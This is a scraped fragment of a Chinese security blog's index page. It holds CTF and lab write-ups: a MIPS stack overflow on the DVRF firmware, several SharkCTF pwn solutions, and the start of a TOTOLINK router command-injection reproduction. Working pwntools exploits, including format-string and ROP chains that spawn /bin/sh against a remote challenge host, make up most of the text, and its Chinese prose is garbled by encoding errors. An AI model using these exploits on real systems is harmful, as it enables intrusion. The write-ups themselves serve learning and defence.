payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨&lt;code&gt;qemu-user&lt;/code&gt;æ¥æ¨¡æ‹Ÿï¼Œå†™ä¸€ä¸ªbashè„šæœ¬å¸®åŠ©æˆ‘ä»¬åˆå§‹åŒ–&lt;br&gt;
è®°å¾—æŠŠæ‰€éœ€çš„é“¾æ¥åº“ç›®å½•å¤åˆ¶åˆ°ç¨‹åºæ‰€åœ¨ç›®å½•ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åä½¿ç”¨&lt;code&gt;gdb-multiarch&lt;/code&gt;ï¼Œä½¿ç”¨&lt;code&gt;set arch mips&lt;/code&gt;æŒ‡å®šæ¶æ„ï¼Œ&lt;code&gt;target remote:1234&lt;/code&gt;å¼€å¯è¿œç¨‹è°ƒè¯•ï¼Œæ ¹æ®&lt;code&gt;cyclic -l&lt;/code&gt;å¯ä»¥ç®—å‡ºåç§»&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*GP   0x448b80
*FP   0x407fffc8 â—‚â€” 0x63616163 (&#39;caac&#39;)
*SP   0x407fffc8 â—‚â€” 0x63616163 (&#39;caac&#39;)
*PC   0x63616162 (&#39;baac&#39;)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Invalid address 0x63616162






â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ fp sp 0x407fffc8 â—‚â€” 0x63616163 (&#39;caac&#39;)
01:0004â”‚       0x407fffcc â—‚â€” 0x63616164 (&#39;daac&#39;)
02:0008â”‚       0x407fffd0 â—‚â€” 0x63616165 (&#39;eaac&#39;)
03:000câ”‚       0x407fffd4 â—‚â€” 0x63616166 (&#39;faac&#39;)
04:0010â”‚       0x407fffd8 â—‚â€” 0x63616167 (&#39;gaac&#39;)
05:0014â”‚       0x407fffdc â—‚â€” 0x63616168 (&#39;haac&#39;)
06:0018â”‚       0x407fffe0 â—‚â€” 0x63616169 (&#39;iaac&#39;)
07:001câ”‚       0x407fffe4 â—‚â€” 0x6361616a (&#39;jaac&#39;)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0 0x63616162
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&amp;gt; cyclic -l 0x63616162
204
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯•æŒ‰ç…§x86çš„æ€è·¯ç›´æ¥è¦†ç›–&lt;code&gt;$ra&lt;/code&gt;ï¼Œè¿™é‡Œä½¿ç”¨byteså­˜åœ¨null bytesè¯»ä¸è¿›å»ï¼Œæœ€åç”¨çš„str&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

payload=&#39;a&#39;*204+&#39;\xe0\x08\x40&#39;

io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åå¼‚å¸¸&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*S8   0x61616161 (&#39;aaaa&#39;)
*GP   0x448b80
 FP   0x0
*SP   0x40800038 â—‚â€” 0
*PC   0x407ff2a9 â—‚â€” beqz   $v0, 0x4081f27d /* 0x10407ff4 */
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x407ff2a9    beqz   $v0, 0x4081f27d
 
   0x407ff2ad    swr    $ra, -0xf($at)
   0x407ff2b1    ll     $zero, 0x7ff4($v0)



â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ s0 sp 0x40800038 â—‚â€” 0
01:0004â”‚       0x4080003c â€”â–¸ 0x40800114 â€”â–¸ 0x4080029e â—‚â€” jalx   0x41ccbcb8 /* 0x74732f2e; &#39;./stack_bof_01&#39; */
02:0008â”‚       0x40800040 â€”â–¸ 0x3ffba724 â—‚â€” 0x4c475f00
03:000câ”‚       0x40800044 â€”â–¸ 0x3ffba354 â—‚â€” 0
04:0010â”‚       0x40800048 â€”â–¸ 0x3feed5d0 â—‚â€” negu   $v0, $a0 /* 0x41023 */
05:0014â”‚       0x4080004c â—‚â€” 0
... â†“          2 skipped
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0 0x407ff2a9
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‚è€ƒSwe3tyåšå®¢ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨MIPSä¸­ï¼Œå‡½æ•°å†…éƒ¨ä¼šé€šè¿‡&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;9&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å¯„&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å­˜&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å™¨&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;å’Œ&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t9å¯„å­˜å™¨å’Œ&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å¯„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å­˜&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å™¨&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;å’Œ&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;gpå¯„å­˜å™¨æ¥æ‰¾æ•°æ®ï¼Œåœ°å€ç­‰ã€‚åŒæ—¶åœ¨mipsçš„æ‰‹å†Œå†…é»˜è®¤$t9çš„å€¼ä¸ºå½“å‰å‡½æ•°çš„å¼€å§‹åœ°å€ï¼Œè¿™æ ·æ‰èƒ½æ­£å¸¸çš„ç´¢å¼•&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨&lt;code&gt;libc.so.0&lt;/code&gt;ä¸­å­˜åœ¨gadgetï¼Œä¸è¿‡mipsropæ‰¾ä¸åˆ°ï¼Œå¯ä»¥æ‰‹åŠ¨å®šä½åˆ°æ­¤å¤„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00006B20 00 00 B9 8F                   lw      $t9, arg_0($sp)
.text:00006B24 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…ˆæ‰‹åŠ¨å…³é—­åœ°å€éšæœºåŒ–&lt;br&gt;
å¯¹äºlibcåŸºå€ï¼Œå¯ä»¥å¯¹ç¨‹åºå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå»ºè®®ä½¿ç”¨&lt;code&gt;b *$rebase(0x*)&lt;/code&gt;çš„æ–¹å¼åŠ æ–­ç‚¹ï¼Œè°ƒè¯•åŠå¤©æ‰æƒ³èµ·æ¥è¿™ä¸ªï¼Œè·³è½¬è¿‡å»æŸ¥çœ‹gotåœ°å€ï¼Œç„¶åæ‰‹ç®—&lt;br&gt;
useræ¨¡å¼ä¸‹vmmapå¹¶ä¸æ–¹ä¾¿ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æŸ¥çœ‹è¿›ç¨‹å†…å­˜æ˜ å°„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo netstat -tunpl|grep 1234 #æŸ¥çœ‹è¿›ç¨‹PID
sudo cat /proc/*/maps   #æŸ¥çœ‹å†…å­˜æ˜ å°„ï¼Œ*ä¸ºè¿›ç¨‹PID
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;80eee000-80f29000 r--p 00000000 00:19 562334                             /home/fk/Desktop/cve/DVRF-master/Firmware/_DVRF_v05.bin.extracted/squashfs-root/pwnable/Intro/lib/libc.so.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åè¿˜æ˜¯ä½¿ç”¨&lt;code&gt;start.sh&lt;/code&gt;ä¸­çš„å‘½ä»¤ï¼Œæ‰€ä»¥æœ€ç»ˆexpä¿®æ”¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

libc_addr=0x80eee000
gadget1=0x6B20+libc_addr
payload=&amp;quot;a&amp;quot;*204+p32(gadget1)+p32(0x4008e0)


with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF stack_bof_01</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YyHpbs2f-/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;test_your_nc&#34;&gt;Test_Your_ncï¼š&lt;/h4&gt;
&lt;p&gt;å¯¹ç¨‹åºè¿›è¡Œé€†å‘åncè¾“å…¥æŒ‡å®šå­—ç¬¦ä¸²å³å¯&lt;/p&gt;
&lt;h4 id=&#34;how_2_getshell&#34;&gt;How_2_getshell?:&lt;/h4&gt;
&lt;p&gt;é™åˆ¶è¾“å…¥é•¿åº¦ä¸”æ¯”è¾ƒ&lt;code&gt;/bin/sh&lt;/code&gt;å­—ç¬¦ä¸²ï¼Œè¾“å…¥&lt;code&gt;sh&lt;/code&gt;å³å¯&lt;/p&gt;
&lt;h4 id=&#34;bignum&#34;&gt;bignumï¼Ÿ:&lt;/h4&gt;
&lt;p&gt;è¾“å…¥&lt;code&gt;-1&lt;/code&gt;å³å¯ç»•è¿‡&lt;/p&gt;
&lt;h4 id=&#34;cr4zy_thursday&#34;&gt;Cr4zy_Thursday!!!ï¼š&lt;/h4&gt;
&lt;p&gt;64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™ï¼Œæ³¨æ„å¯¹é½&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8405)

# gdb.attach(io)
# pause()

flag_addr=0x060108C

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x32,8).encode().ljust(0x10,b&amp;quot;\x00&amp;quot;)+p64(flag_addr)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;stack_overflow&#34;&gt;Stack_Overflow:&lt;/h4&gt;
&lt;p&gt;64ä½æ ˆæº¢å‡º&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8406)


# gdb.attach(io)
# pause()

payload=cyclic(0x28)+p64(0x400717)
io.sendafter(b&amp;quot;ght\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ä½ å–œæ¬¢é‡‘ä¸é›€å—&#34;&gt;ä½ å–œæ¬¢é‡‘ä¸é›€å—ï¼š&lt;/h4&gt;
&lt;p&gt;å‡ºé¢˜äººçš„æœ¬æ„åº”è¯¥æ˜¯å¥½çš„ï¼Œç¼–è¯‘å™¨æ‰§è¡Œçš„æ›´å¥½äº†&lt;br&gt;
ä¸åŒä»¥å¾€ï¼Œç¨‹åºæœ€åç»“æŸçš„æ—¶å€™è¿›å…¥äº†å¦å¤–ä¸€ä¸ªåˆ†æ”¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;loc_80486A5:
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
; } // starts at 80485F9
main endp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canaryå’Œæ ˆåœ°å€&lt;br&gt;
è·å–canaryåä¸èƒ½ç›´æ¥æº¢å‡ºå†™ï¼Œéœ€è¦é€šè¿‡æ§åˆ¶æ ˆä¸Šæ•°æ®è¿›ä¸€æ­¥æ§åˆ¶å¯„å­˜å™¨&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;101.42.30.15&amp;quot;,8407)

gdb.attach(io)
pause()

io.sendafter(b&amp;quot;you!!!!!\n&amp;quot;,b&amp;quot;%15$p.%1$p&amp;quot;.ljust(0x10,b&amp;quot;.&amp;quot;))
canary=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
stack=int(io.recv(10),16)+0x10
print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;stack: &amp;quot;,hex(stack))


payload=p32(0x80485e0)*8+p32(canary)+p32(stack)*3
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;åŸç¥å¯åŠ¨&#34;&gt;åŸç¥ï¼Œå¯åŠ¨ï¼ï¼š&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;where_to_go&lt;/code&gt;å¯ä»¥å¾€æ ˆä¸Šè¯»æ•°æ®ï¼Œå¯ä»¥å¸ƒç½®ropé“¾&lt;br&gt;
&lt;code&gt;dress&lt;/code&gt;å¯ä»¥å®ç°æ ˆä¸Šå†™8å­—èŠ‚&lt;br&gt;
ä¸€å¼€å§‹ç›´æ¥åˆ©ç”¨æ ˆä¸Šå†™8å­—èŠ‚ç‰¹æ€§ä¿®æ”¹retåœ°å€ä½ä¸‰å­—èŠ‚ï¼Œçˆ†ç ´åŠå­—èŠ‚æ‰“one_gadgetï¼Œ1/16æ¦‚ç‡æœ¬åœ°èƒ½å‡ºä¸¤ä¸ªï¼Œè¿œç«¯å¼€4ä¸ªç»ˆç«¯çˆ†ä¸€æ™šä¸Šä¸é€šï¼Œæ”¹ç”¨ropçš„æ–¹å¼&lt;br&gt;
æ€»ä¹‹å¤šè°ƒè¯•ä¸€ä¸‹å°±è¡Œäº†ï¼Œæœ€åæ³„éœ²åå»ºè®®è¿”å›mainå‡½æ•°ï¼Œä¸ç„¶å¯„å­˜å™¨å€¼æ›´æ”¹åå®¹æ˜“å¡ä½&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

# io=process(&amp;quot;./ys&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
elf=ELF(&amp;quot;./ys&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


pop_rdi=0x4009b3
# gdb.attach(io)
# pause()

sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008f3)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)


# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))

# sleep(1)
# io.recv()
# sleep(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()


sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(0)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))



io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004009ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009ae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009b0 : pop r14 ; pop r15 ; ret
# 0x00000000004009b2 : pop r15 ; ret
# 0x00000000004009ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009af : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x00000000004009b3 : pop rdi ; ret
# 0x00000000004009b1 : pop rsi ; pop r15 ; ret
# 0x00000000004009ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400589 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åè¿˜æ˜¯æ”¾ä¸€ä¸ªçˆ†ç ´çš„è„šæœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

while True:
    try:
        io=process(&amp;quot;./ys&amp;quot;)
        # io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
        elf=ELF(&amp;quot;./ys&amp;quot;)
        libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

        # gdb.attach(io)
        # pause()
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;10086&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;1&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;88&amp;quot;)
        # sleep(1)

        io.recv()
        # sleep(1)
        # sleep(2)
        io.send(b&amp;quot;\x47\x12\x8f&amp;quot;)
        sleep(2)
        io.sendline(&amp;quot;ls&amp;quot;)
        sleep(2)
        ret = io.recv()
        if b&amp;quot;flag&amp;quot; in ret:
            io.sendline(&amp;quot;cat flag&amp;quot;)
            sleep(1)
            print(io.recv())
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        else:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()

    except:
        io.close()
        continue

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">SharkCTF éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MPIXkmDvQ/"" data-c="
          &lt;h3 id=&#34;æ¦‚è¿°&#34;&gt;&lt;strong&gt;æ¦‚è¿°&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;TOTOLINK A7000R V9.1.0u.6115_B20201022 ç‰ˆæœ¬å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäº &lt;code&gt;setDiagnosisCfg&lt;/code&gt; çš„ ip å‚æ•°å­˜åœ¨å‘½ä»¤æ³¨å…¥é—®é¢˜&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html&#34;&gt;ä¸‹è½½é“¾æ¥&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´&#34;&gt;&lt;strong&gt;æ¼æ´&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/cgi-bin/cstecgi.cgi&lt;/code&gt;çš„&lt;code&gt;setDiagnosisCfg&lt;/code&gt; ä»è¯·æ±‚ä¸­è·å–&lt;code&gt;ip&lt;/code&gt;å‚æ•°å¹¶é€šè¿‡&lt;code&gt;sprintf&lt;/code&gt;å‡½æ•°å°†å‚æ•°æ ¼å¼åŒ–æ‹¼æ¥åœ¨å˜é‡&lt;code&gt;acStack_90&lt;/code&gt;åï¼Œæœ€åå°†&lt;code&gt;acStack_90&lt;/code&gt;ä¼ å…¥&lt;code&gt;doSystem&lt;/code&gt;å‡½æ•°ä¸­&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691497823589.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;grep -rnl &amp;quot;doSystem&amp;quot;&lt;/code&gt;é€’å½’æŸ¥æ‰¾ç›¸å…³æ–‡ä»¶&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498085539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é”å®š&lt;code&gt;libcshared.so&lt;/code&gt;åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æŸ¥æ‰¾å‡½æ•°å®ç°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498379028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å°†å‚æ•°&lt;code&gt;param1&lt;/code&gt;é€šè¿‡&lt;code&gt;vnsprintf&lt;/code&gt;å‡½æ•°æ ¼å¼åŒ–åå­˜å‚¨åˆ°&lt;code&gt;acStack_20c&lt;/code&gt;ä¸­æœ€åä¼ å…¥&lt;code&gt;system&lt;/code&gt;å‡½æ•°ä¸­ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ&lt;/p&gt;
&lt;h3 id=&#34;å¤ç°&#34;&gt;&lt;strong&gt;å¤ç°&lt;/strong&gt;ï¼š&lt;/h3&gt;
&lt;p&gt;é¦–å…ˆé…ç½®ç½‘ç»œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # åˆ›å»ºç½‘æ¡¥
sudo ifconfig virbr2 192.168.122.1/24 up # é…ç½®ç½‘æ¡¥IP
sudo tunctl -t tap2 # æ·»åŠ è™šæ‹Ÿç½‘å¡tap2
sudo ifconfig tap2 192.168.122.11/24 up # é…ç½®è™šæ‹Ÿç½‘å¡IP
sudo brctl addif virbr2 tap2 # é…ç½®è™šæ‹Ÿç½‘å¡ä¸ç½‘æ¡¥è¿æ¥
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;æå–å›ºä»¶åè¿›å…¥&lt;code&gt;/squashfs-root/bin/&lt;/code&gt;ä¸‹æ‰§è¡Œ&lt;code&gt;readelf -h busybox&lt;/code&gt;æŸ¥çœ‹ç›¸å…³ä¿¡æ¯&lt;/p&gt;
